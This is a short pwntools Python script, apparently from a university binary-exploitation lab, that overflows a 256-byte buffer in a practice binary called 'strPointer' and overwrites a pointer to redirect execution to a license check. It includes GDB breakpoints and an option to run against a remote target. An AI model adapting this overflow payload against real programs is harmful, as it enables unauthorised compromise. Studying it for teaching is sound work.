#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


# define payload here because it's passed as an argument to the binary:
licensePtr=pwn.p32(0x804a01a)

overFlow = 256*b'A'
Bs = 4 * b'B'

payload = pwn.flat(
        [
            overFlow,
            Bs,
            licensePtr
            ]
        )

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath, payload], gdbscript=gdbscript, aslr=False, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath, payload], aslr=False, *a, **kw)


binPath="/home/kali/ENPM691/Lecture9/strPointer"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *license+49
break *license+55
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="debug"
io = start()
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

io.interactive()
